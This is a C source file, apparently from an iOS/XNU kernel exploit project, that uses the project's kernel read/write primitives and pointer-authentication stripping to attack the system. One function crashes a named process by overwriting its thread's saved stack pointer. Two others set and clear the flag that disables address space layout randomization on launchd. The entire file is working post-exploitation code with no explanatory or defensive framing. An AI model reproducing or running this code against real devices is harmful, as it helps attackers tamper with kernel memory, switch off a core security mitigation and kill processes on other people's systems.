//
//  process.c
//  darksword-kexploit-fun
//
//  Created by seo on 3/26/26.
//

#include "process.h"
#include "../kexploit/kutils.h"
#include "../kexploit/krw.h"
#include "../kexploit/xpaci.h"
#include "../kexploit/offsets.h"

int crash_process(const char* name) {
    uint64_t proc = proc_find_by_name(name);
    uint64_t task = proc_task(proc);
    
    uint64_t threads = kread64(task + off_task_threads_next);
    
    uint64_t upcb = kread64(threads + off_thread_machine_upcb);
    upcb = xpaci(upcb);
    
    uint64_t state = upcb + off_arm_saved_state_uss_ss_64;
    
    kwrite64(state + offsetof(struct arm_saved_state64, sp), 0x1337133713371337);
    
    return 0;
}

// xnu-10002.81.5/bsd/sys/proc.h
#define P_DISABLE_ASLR  0x00001000      /* Disable address space layout randomization */
int disable_aslr(void) {

    uint64_t launchd_proc = proc_find(1);
    uint32_t p_flag = kread32(launchd_proc + off_proc_p_flag);

    kwrite32(launchd_proc + off_proc_p_flag, p_flag | P_DISABLE_ASLR);

    return 0;
}

int enable_aslr(void) {

    uint64_t launchd_proc = proc_find(1);
    uint32_t p_flag = kread32(launchd_proc + off_proc_p_flag);

    kwrite32(launchd_proc + off_proc_p_flag, p_flag &~P_DISABLE_ASLR);

    return 0;
}
